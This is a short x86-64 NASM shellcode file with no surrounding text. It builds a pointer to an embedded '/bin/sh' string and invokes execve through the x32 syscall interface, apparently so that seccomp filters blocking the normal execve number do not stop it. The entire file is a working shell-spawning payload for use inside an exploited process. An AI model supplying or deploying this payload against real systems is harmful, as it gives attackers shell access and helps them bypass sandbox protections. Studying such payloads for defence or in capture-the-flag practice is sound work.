BITS 64
global _start

_start:
	lea rdi, [rel $]
	add dil, 0x1f	; pathname = "/bin/sh"
	xor rsi, rsi	; argv = NULL
	xor rdx, rdx	; envp = NULL

	xor rax, rax
	inc eax
	shl eax, 30	; __X32_SYSCALL_BIT
	mov ax, 0x208	; x32_execve
	syscall

fname:
	db "/bin/sh", 0x00
	db 0x0a
